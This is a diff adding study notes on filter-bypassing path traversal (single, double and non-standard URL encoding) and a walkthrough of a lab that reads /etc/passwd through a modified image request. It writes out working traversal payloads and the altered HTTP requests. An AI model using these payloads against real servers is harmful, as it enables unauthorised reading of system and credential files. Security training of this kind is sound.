@@ -1050,3 +1050,411 @@ GET /image?filename=....//....//....//etc/passwd HTTP/2
 ```
 
 ---
+# Topic: Bypassing Path Traversal Filters Using URL Encoding
+
+## Simple Idea
+
+Some web servers try to protect applications by removing:
+
+```text
+../
+```
+
+before the request reaches the application.
+
+For example:
+
+```text
+../../../etc/passwd
+```
+
+becomes:
+
+```text
+etc/passwd
+```
+
+The attack fails.
+
+However, attackers may try to hide the traversal sequence using **encoding**.
+
+
+# What is URL Encoding?
+
+Certain characters can be represented using hexadecimal values.
+
+Examples:
+
+| Character | URL Encoded |
+| --------- | ----------- |
+| `.`       | `%2e`       |
+| `/`       | `%2f`       |
+| `\`       | `%5c`       |
+
+So:
+
+```text
+../
+```
+
+becomes:
+
+```text
+%2e%2e%2f
+```
+
+# Example
+
+Normal traversal:
+
+```text
+../../../etc/passwd
+```
+
+URL-encoded traversal:
+
+```text
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+```
+
+If the server decodes the input after filtering, the traversal may still work.
+
+
+# Double URL Encoding
+
+Sometimes the server decodes input twice.
+
+In such cases, attackers may encode the `%` character itself.
+
+### First Encoding
+
+```text
+../
+```
+
+↓
+
+```text
+%2e%2e%2f
+```
+
+### Second Encoding
+
+```text
+%252e%252e%252f
+```
+
+because:
+
+```text
+%  →  %25
+```
+
+## Decoding Process
+
+### User Sends
+
+```text
+%252e%252e%252f
+```
+
+### First Decode
+
+```text
+%2e%2e%2f
+```
+
+### Second Decode
+
+```text
+../
+```
+
+Now the traversal sequence appears again.
+
+
+# Visualization
+
+```text
+../
+ ↓
+%2e%2e%2f
+ ↓
+%252e%252e%252f
+```
+
+Server:
+
+```text
+%252e%252e%252f
+ ↓ Decode #1
+%2e%2e%2f
+ ↓ Decode #2
+../
+```
+
+
+# Non-Standard Encodings
+
+Some systems may accept unusual encodings.
+
+Examples:
+
+```text
+..%c0%af
+```
+
+```text
+..%ef%bc%8f
+```
+
+These can sometimes be interpreted as:
+
+```text
+../
+```
+
+depending on how the application processes input.
+
+
+# Why Does This Work?
+
+The problem occurs when:
+
+```text
+Filter
+   ↓
+Decode
+```
+
+instead of:
+
+```text
+Decode
+   ↓
+Validate
+```
+
+The filter never sees the real traversal sequence because it is hidden inside encoded characters.
+
+
+# Example Attack Flow
+
+```text
+Attacker
+    ↓
+Sends %2e%2e%2f
+    ↓
+Web Server
+    ↓
+Decodes to ../
+    ↓
+Application
+    ↓
+Reads sensitive file
+```
+
+# Burp Suite Tip
+
+In practical labs and penetration testing, testers often try multiple encoded traversal payloads.
+
+**Burp Suite Intruder** includes a predefined payload list called:
+
+```text
+Fuzzing - path traversal
+```
+
+which contains various encoded traversal patterns for testing.
+
+---
+# Path Traversal Using Double URL Encoding
+
+![lab1-](screenshots/labp4.png)
+
+## Step 1: Intercept a Product Image Request
+
+1. Open any product page.
+2. Click on a product image.
+3. In Burp Suite, go to:
+
+```text
+Proxy > HTTP History
+```
+
+4. Locate the image request.
+
+Example:
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+## Step 2: Modify the Filename Parameter
+
+Replace:
+
+```http
+filename=218.png
+```
+
+with:
+
+```http
+filename=..%252f..%252f..%252fetc/passwd
+```
+
+Modified request:
+
+```http
+GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
+```
+
+## Step 3: Send the Request
+
+1. Forward the modified request.
+2. Observe the response.
+
+
+## Step 4: View File Contents
+
+The application returns the contents of:
+
+```text
+/etc/passwd
+```
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+
+![lab1-](screenshots/labp4b.png)
+
+## Step 5: Lab Solved
+
+Successfully reading:
+
+```text
+/etc/passwd
+```
+
+solves the lab.
+
+![lab1-](screenshots/labp4s.png)
+
+# Why This Works
+
+## Normal Traversal
+
+```text
+../../../etc/passwd
+```
+
+contains:
+
+```text
+../
+```
+
+Many applications block this pattern.
+
+## Single URL Encoding
+
+```text
+..%2f..%2f..%2fetc/passwd
+```
+
+where:
+
+```text
+%2f = /
+```
+
+Some filters decode and block this.
+
+## Double URL Encoding
+
+Payload used:
+
+```text
+..%252f..%252f..%252fetc/passwd
+```
+
+where:
+
+```text
+%25 = %
+```
+
+First decode:
+
+```text
+..%2f..%2f..%2fetc/passwd
+```
+
+Second decode:
+
+```text
+../../../etc/passwd
+```
+
+Result:
+
+```text
+Server processes the traversal sequence.
+```
+
+while the filter may only inspect the first decoding stage.
+
+# Decoding Process
+
+### Payload Sent
+
+```text
+..%252f..%252f..%252fetc/passwd
+```
+
+↓
+
+### First Decode
+
+```text
+..%2f..%2f..%2fetc/passwd
+```
+
+↓
+
+### Second Decode
+
+```text
+../../../etc/passwd
+```
+
+↓
+
+### Final File Accessed
+
+```text
+/etc/passwd
+```
+
+# Request Example
+
+### Original Request
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+### Modified Request
+
+```http
+GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
+```
+
+---
